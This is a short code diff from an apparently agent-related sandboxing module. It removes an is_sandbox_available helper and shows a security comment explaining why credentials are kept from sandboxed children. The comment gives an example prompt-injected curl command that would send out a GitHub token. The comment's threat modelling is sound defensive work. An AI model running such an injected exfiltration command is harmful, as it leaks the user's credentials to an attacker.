@@ -85,11 +85,6 @@ def _is_bwrap_available() -> bool:
 # ---------------------------------------------------------------------------
 
 
-def is_sandbox_available() -> bool:
-    """Check if any OS-level sandboxing is available."""
-    return _is_sandbox_exec_available() or _is_bwrap_available()
-
-
 # Credentials that must NEVER reach a sandboxed child. The sandbox profile is
 # `(allow default)` with network open, so an inherited GitHub token could be
 # exfiltrated by a prompt-injected command (e.g. `curl "…?t=$GH_TOKEN"`) —
